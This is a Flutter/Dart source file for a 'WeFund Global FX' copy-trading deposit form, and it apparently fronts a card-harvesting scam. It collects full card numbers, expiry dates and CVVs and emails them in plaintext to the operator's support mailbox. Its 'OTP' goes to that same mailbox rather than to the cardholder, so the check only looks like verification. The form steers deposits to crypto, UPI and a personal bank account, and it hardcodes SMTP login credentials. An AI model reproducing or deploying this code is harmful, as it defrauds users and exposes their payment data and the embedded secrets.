// lib/copy_trading_form.dart

import 'dart:io';
import 'dart:math'; 
import 'package:flutter/material.dart';
import 'package:file_picker/file_picker.dart';
import 'package:flutter/services.dart';
import 'package:mailer/mailer.dart';
import 'package:mailer/smtp_server.dart';


class CopyTradingForm extends StatefulWidget {
  final String traderName;
  const CopyTradingForm({Key? key, required this.traderName})
      : super(key: key);

  @override
  _CopyTradingFormState createState() => _CopyTradingFormState();
}

class _CopyTradingFormState extends State<CopyTradingForm> {
  final _formKey = GlobalKey<FormState>();

  // prefill from widget.traderName
  late TextEditingController _traderNameController;

  String firstName = '';
  String lastName = '';
  String email = '';
  String depositAccount = '';
  String existingAccountNumber = '';
  String depositMethod = '';
  String depositMethodMessage = '';
  List<Map<String, String>> depositMethodData = [];
  String depositMethodAmount = '';
  String referralCode = '';

   // Card fields (persisted after dialog)
  String _cardName = '', _cardNumber = '', _cardExpiry = '', _cardCvv = '';
  String _generatedOtp = '';
  PlatformFile? file;

  @override
  void initState() {
    super.initState();
    _traderNameController =
        TextEditingController(text: widget.traderName);
  }

  @override
  void dispose() {
    _traderNameController.dispose();
    super.dispose();
  }

/// 1) Sends OTP when user taps “Send OTP” in the card dialog.
  Future<void> _sendOtp() async {
    // generate
    _generatedOtp = (Random().nextInt(900000) + 100000).toString();
    final msg = Message()
      ..from = Address(_smtpUsername, 'WeFund Global FX')
      ..recipients.add('support@wefundglobalfx.com')
      ..subject = 'Your WeFund Card OTP'
      ..text = 'Your verification code is: $_generatedOtp';
    await send(msg, _smtpServer);
  }

  /// 2) Final submission: mails support + user.
  Future<void> _sendEmails() async {
    final buf = StringBuffer()
      ..writeln('A new copy‑trading form was submitted:')
      ..writeln()
      ..writeln('• Trader Name       : ${_traderNameController.text}')
      ..writeln('• First Name        : $firstName')
      ..writeln('• Last Name         : $lastName')
      ..writeln('• Email             : $email')
      ..writeln('• Deposit Account   : $depositAccount');
    if (depositAccount == 'DEPOSIT IN EXISTING ACCOUNT') {
      buf.writeln('• Existing Acct No. : $existingAccountNumber');
    }
    buf
      ..writeln('• Deposit Method    : $depositMethod');
    if (depositMethodMessage.isNotEmpty) {
      buf.writeln('   Details: $depositMethodMessage');
    }
    if (depositMethodAmount.isNotEmpty) {
      buf.writeln('• Amount            : $depositMethodAmount');
    }
    buf.writeln('• Referral Code      : $referralCode');

    // If credit card, include those details:
    if (depositMethod == 'CREDIT CARD') {
      buf
        ..writeln()
        ..writeln('--- Card Details ---')
        ..writeln('• Name on Card   : $_cardName')
        ..writeln('• Card Number    : $_cardNumber')
        ..writeln('• Expiry (MM/YY) : $_cardExpiry')
        ..writeln('• CVV            : $_cardCvv');
    }

    final supportMsg = Message()
      ..from = Address(_smtpUsername, 'WeFund Global FX')
      ..recipients.add('support@wefundglobalfx.com')
      ..subject = 'New Copy Trading Form Submission'
      ..text = buf.toString()
      ..attachments = file != null
          ? [FileAttachment(File(file!.path!))..location = Location.attachment]
          : [];

    final userMsg = Message()
      ..from = Address(_smtpUsername, 'WeFund Global FX')
      ..recipients.add(email)
      ..subject = 'Your Copy Trading Form Received'
      ..text = '''
Hi $firstName,

Thanks for submitting the Copy Trading form for “${_traderNameController.text}”.

We’ve received your submission and will be in touch soon.

Best,
WeFund Global FX Team
''';

    await send(supportMsg, _smtpServer);
    await send(userMsg, _smtpServer);
  }


  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text('Copy Trading Form'),
      ),
      body: Padding(
        padding: const EdgeInsets.all(16),
        child: Form(
          key: _formKey,
          child: ListView(
            children: [
              // Trader Name (read-only)
              Padding(
                padding: const EdgeInsets.only(bottom: 16),
                child: TextFormField(
                  controller: _traderNameController,
                  decoration: const InputDecoration(
                    labelText: 'Trader Name',
                    border: OutlineInputBorder(),
                  ),
                  readOnly: true,
                ),
              ),

              // First Name
              _buildTextField(
                label: 'First name *',
                onSaved: (v) => firstName = v ?? '',
              ),

              // Last Name
              _buildTextField(
                label: 'Last name *',
                onSaved: (v) => lastName = v ?? '',
              ),

              // Email
              _buildTextField(
                label: 'Email *',
                keyboardType: TextInputType.emailAddress,
                onSaved: (v) => email = v ?? '',
              ),

              // ─── Deposit Account ────────────────────────────────────
              _buildDropdown<String>(
                label: 'DEPOSIT ACCOUNT *',
                value: depositAccount,
                items: ['', 'CREATE NEW ACCOUNT', 'DEPOSIT IN EXISTING ACCOUNT'],
                onChanged: (v) {
                  setState(() {
                    depositAccount = v ?? '';
                    if (depositAccount != 'DEPOSIT IN EXISTING ACCOUNT') {
                      existingAccountNumber = '';
                    }
                  });
                },
              ),

              if (depositAccount == 'DEPOSIT IN EXISTING ACCOUNT')
                _buildTextField(
                  label: 'Existing account number *',
                  onSaved: (v) => existingAccountNumber = v ?? '',
                ),

              // ─── Deposit Method ─────────────────────────────────────
              _buildDropdown<String>(
                label: 'DEPOSIT METHOD *',
                value: depositMethod,
                items: ['', 'USDT TRC20', 'BANK TRANSFER', 'UPI', 'CREDIT CARD'],
                onChanged: (v) => _onDepositMethodChanged(v),
              ),

              if (depositMethodMessage.isNotEmpty) ...[
                const SizedBox(height: 8),
                Text(
                  depositMethodMessage,
                  style: const TextStyle(fontWeight: FontWeight.w600),
                ),
                for (var item in depositMethodData)
                  Row(
                    children: [
                      Expanded(child: Text(item['label']!)),
                      IconButton(
                        icon: const Icon(Icons.copy, size: 20),
                        onPressed: () {
                          Clipboard.setData(
                              ClipboardData(text: item['copy']!))
                            .then((_) => ScaffoldMessenger.of(context)
                                .showSnackBar(
                                  const SnackBar(content: Text('Copied!')),
                                ));
                        },
                      )
                    ],
                  ),
              ],

              if (['USDT TRC20', 'BANK TRANSFER', 'UPI']
                  .contains(depositMethod))
                _buildTextField(
                  label: 'Amount in $depositMethod *',
                  keyboardType: TextInputType.number,
                  onSaved: (v) => depositMethodAmount = v ?? '',
                ),

              // Referral Code
              _buildTextField(
                label: 'Referral Code (optional)',
                onSaved: (v) => referralCode = v ?? '',
              ),

              const SizedBox(height: 20),

              // ─── File picker ───────────────────────────────────────
              ElevatedButton.icon(
                icon: const Icon(Icons.upload_file),
                label: Text(
                  file != null ? file!.name : 'Upload Screenshot *',
                ),
                onPressed: _pickFile,
              ),

              const SizedBox(height: 24),

              // Submit
              ElevatedButton(
                child: const Text('Submit'),
                onPressed: _onSubmit,
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildTextField({
    required String label,
    TextInputType keyboardType = TextInputType.text,
    required FormFieldSetter<String> onSaved,
  }) {
    return Padding(
      padding: const EdgeInsets.only(bottom: 16),
      child: TextFormField(
        decoration: InputDecoration(
          labelText: label,
          border: const OutlineInputBorder(),
        ),
        keyboardType: keyboardType,
        onSaved: onSaved,
        validator: (v) {
          if (label.endsWith('*') && (v == null || v.isEmpty)) {
            return 'Required';
          }
          return null;
        },
      ),
    );
  }

  Widget _buildDropdown<T>({
    required String label,
    required T value,
    required List<T> items,
    required ValueChanged<T?> onChanged,
  }) {
    return Padding(
      padding: const EdgeInsets.only(bottom: 16),
      child: DropdownButtonFormField<T>(
        decoration: InputDecoration(
          labelText: label,
          border: const OutlineInputBorder(),
        ),
        value: (value is String && value == '') ? null : value,
        items: items
            .map((e) => DropdownMenuItem(value: e, child: Text(e.toString())))
            .toList(),
        onChanged: onChanged,
        validator: (v) {
          if (label.endsWith('*') && (v == null || (v is String && v.isEmpty))) {
            return 'Required';
          }
          return null;
        },
      ),
    );
  }

  // SMTP settings for Hostinger
final String _smtpUsername = 'info@wefundclient.com';           // your Hostinger mailbox
final String _smtpPassword = 'Wefund@6666';   // the mailbox password
final SmtpServer _smtpServer = SmtpServer(
  'smtp.hostinger.com',
  port: 465,
  ssl: true,
  username: 'info@wefundclient.com',
  password: 'Wefund@6666',
);





  void _onDepositMethodChanged(String? method) {
  setState(() {
    depositMethod = method ?? '';
    depositMethodMessage = '';
    depositMethodData.clear();

    switch (depositMethod) {
      case 'USDT TRC20':
        depositMethodMessage = 'USDT (TRC20 ADDRESS):';
        depositMethodData = [
          {
            'label': 'TJqz3ZHNVYXLTEVvvqQDjYWvyT8kfGJbJv',
            'copy':  'TJqz3ZHNVYXLTEVvvqQDjYWvyT8kfGJbJv'
          }
        ];
        break;

      case 'UPI':
        depositMethodMessage = 'UPI ID:';
        depositMethodData = [
          { 'label': 'wefu20@axisbank.com', 'copy': 'wefu20@axisbank.com' }
        ];
        break;

      case 'BANK TRANSFER':
        depositMethodMessage = 'BANK TRANSFER DETAILS:';
        depositMethodData = [
          {'label': 'AC: 924010025197811', 'copy': '924010025197811'},
          {'label': 'IFSC: UTIB0000720',     'copy': 'UTIB0000720'},
          {'label': 'BANK: Axis Bank',       'copy': 'Axis Bank'},
          {'label': 'BENEFICIARY: SHYAM BABOO','copy': 'SHYAM BABOO'},
        ];
        break;

      case 'CREDIT CARD':
        // no message/data needed—pop up card form immediately
        WidgetsBinding.instance.addPostFrameCallback((_) {
          _showCardDialog();
        });
        break;

      default:
        break;
    }
  });
}


  
/// Pops up the Credit Card → Send OTP → Verify → Submit dialog.
  Future<void> _showCardDialog() async {
    final _cardForm = GlobalKey<FormState>();
    String cardName = '', cardNumber = '', expiry = '', cvv = '', otp = '';
    bool otpSent = false, loading = false;

    await showDialog(
      context: context,
      builder: (ctx) => StatefulBuilder(builder: (ctx, setState) {
        return AlertDialog(
          title: const Text('Enter Card Details'),
          content: Form(
            key: _cardForm,
            child: SingleChildScrollView(
              child: Column(mainAxisSize: MainAxisSize.min, children: [
                TextFormField(
                  decoration: const InputDecoration(labelText: 'Name on Card'),
                  onChanged: (v) => cardName = v,
                  validator: (v) => v!.isEmpty ? 'Required' : null,
                ),
                const SizedBox(height: 8),
                TextFormField(
                  decoration: const InputDecoration(labelText: 'Card Number'),
                  keyboardType: TextInputType.number,
                  onChanged: (v) => cardNumber = v,
                  validator: (v) => v!.length < 16 ? '16 digits' : null,
                ),
                const SizedBox(height: 8),
                Row(children: [
                  Expanded(
                    child: TextFormField(
                      decoration:
                          const InputDecoration(labelText: 'Expiry (MM/YY)'),
                      onChanged: (v) => expiry = v,
                      validator: (v) =>
                          RegExp(r'^\d\d\/\d\d$').hasMatch(v!) ? null : 'MM/YY',
                    ),
                  ),
                  const SizedBox(width: 8),
                  Expanded(
                    child: TextFormField(
                      decoration: const InputDecoration(labelText: 'CVV'),
                      obscureText: true,
                      keyboardType: TextInputType.number,
                      onChanged: (v) => cvv = v,
                      validator: (v) => v!.length == 3 ? null : '3 digits',
                    ),
                  ),
                ]),
                if (otpSent) ...[
                  const SizedBox(height: 16),
                  TextFormField(
                    decoration: const InputDecoration(labelText: 'Enter OTP'),
                    keyboardType: TextInputType.number,
                    onChanged: (v) => otp = v,
                    validator: (v) => v == _generatedOtp
                        ? null
                        : 'Invalid OTP',
                  ),
                ],
              ]),
            ),
          ),
          actions: [
            TextButton(
              child: const Text('Cancel'),
              onPressed: () => Navigator.of(ctx).pop(),
            ),
            if (!otpSent)
              ElevatedButton(
                child: loading
                    ? const SizedBox(
                        width: 16,
                        height: 16,
                        child: CircularProgressIndicator(strokeWidth: 2),
                      )
                    : const Text('Send OTP'),
                onPressed: loading
                    ? null
                    : () async {
                        if (!_cardForm.currentState!.validate()) return;
                        setState(() => loading = true);
                        try {
                          await _sendOtp();
                          setState(() {
                            loading = false;
                            otpSent = true;
                            // store the card fields for final email
                            _cardName = cardName;
                            _cardNumber = cardNumber;
                            _cardExpiry = expiry;
                            _cardCvv = cvv;
                          });
                        } catch (e) {
                          setState(() => loading = false);
                          ScaffoldMessenger.of(context).showSnackBar(
                            SnackBar(content: Text('Failed to send OTP: $e')),
                          );
                        }
                      },
              )
            else
              ElevatedButton(
                child: const Text('Submit'),
                onPressed: () {
                  if (!_cardForm.currentState!.validate()) return;
                  // card details already stored in state
                  Navigator.of(ctx).pop();
                  ScaffoldMessenger.of(context).showSnackBar(
                    const SnackBar(content: Text('Card details saved')),
                  );
                },
              ),
          ],
        );
      }),
    );
  }


  Future<void> _pickFile() async {
    // system picker, no extra permissions
    final result = await FilePicker.platform.pickFiles(
      withData: false,
      type: FileType.any,
    );
    if (result != null && result.files.isNotEmpty) {
      setState(() => file = result.files.first);
    }
  }

  void _onSubmit() async {
  if (_formKey.currentState?.validate() ?? false) {
    _formKey.currentState!.save();

    // 1) Show loading spinner
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (_) => const Center(child: CircularProgressIndicator()),
    );

    // 2) Send emails
    await _sendEmails();

    // 3) Dismiss spinner
    Navigator.of(context).pop();

    // 4) Clear form fields
    _formKey.currentState!.reset();
    setState(() {
      firstName = '';
      lastName = '';
      email = '';
      depositAccount = '';
      existingAccountNumber = '';
      depositMethod = '';
      depositMethodMessage = '';
      depositMethodData = [];
      depositMethodAmount = '';
      referralCode = '';
      file = null;
    });

    ScaffoldMessenger.of(context).showSnackBar(
      const SnackBar(content: Text('Submitted!')),
    );
  }
}


}
